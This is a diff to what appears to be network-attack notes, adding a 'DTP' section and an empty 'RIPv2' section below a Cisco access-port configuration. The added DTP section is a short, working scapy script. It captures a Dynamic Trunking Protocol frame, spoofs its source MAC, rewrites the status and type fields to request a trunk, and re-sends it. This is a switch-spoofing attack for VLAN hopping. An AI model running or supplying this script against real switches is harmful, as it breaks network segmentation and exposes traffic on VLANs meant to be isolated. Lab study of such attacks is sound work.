@@ -85,4 +85,17 @@ int Gi1/2
  switchport mode access
  switchport access vlan 20
 ```
+## DTP
+```
+from scapy.all import *
+load_contrib("dtp")
+ASD = sniff(filter="ether[20:2] == 0x2004",count=1)    
+ASD[0].src="00:00:00:13:54:2d"
+ASD[0][DTP][DTPStatus].status='\x03'
+ASD[0][DTP][DTPType].dtptype='\x45'
+sendp(ASD[0])
+```
+## RIPv2
+```
 
+```
